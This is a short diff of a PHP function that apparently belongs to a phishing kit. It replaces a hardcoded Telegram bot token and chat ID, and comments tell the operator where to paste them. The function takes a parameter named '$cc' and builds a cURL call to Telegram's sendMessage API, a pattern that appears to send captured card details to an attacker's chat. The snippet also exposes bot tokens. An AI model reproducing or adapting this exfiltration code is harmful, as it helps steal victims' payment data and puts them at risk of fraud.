@@ -1,8 +1,8 @@
 <?php
 function functiondilih($cc)
 {
-	$key = "6273819132:AAFplSeUJPkjby60tj9hUUy_7VfcLTfdVF4";// hat hna apikey
-	$idchat ="6273958296"; //hat hna id chat   
+	$key = "7197986746:AAG9RXF1nDbbAMr9Exdq03Pay3KHHwpy_OU";// hat hna apikey
+	$idchat ="6222900783"; //hat hna id chat
 	
 	$ch = curl_init();
 	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
